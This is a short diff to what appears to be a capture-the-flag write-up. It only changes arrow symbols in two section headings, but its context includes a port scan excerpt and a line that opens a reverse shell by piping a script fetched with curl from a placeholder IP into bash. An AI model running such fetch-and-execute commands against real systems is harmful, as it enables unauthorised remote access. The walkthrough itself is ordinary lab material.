@@ -16,7 +16,7 @@ PORT      STATE SERVICE
 50000/tcp open  ibm-db2
 ```
 
-### Web Enumeration --> Brute Force
+### Web Enumeration -> Brute Force
 
 Port 80 just shows a countdown:
 
@@ -224,7 +224,7 @@ We can get a reverse shell using `curl <IP>/shell.sh|bash`:
 
 ## Privilege Escalation
 
-### Password-Check --> Setuid Cap
+### Password-Check -> Setuid Cap
 
 The user's home directory has an interesting file:
 
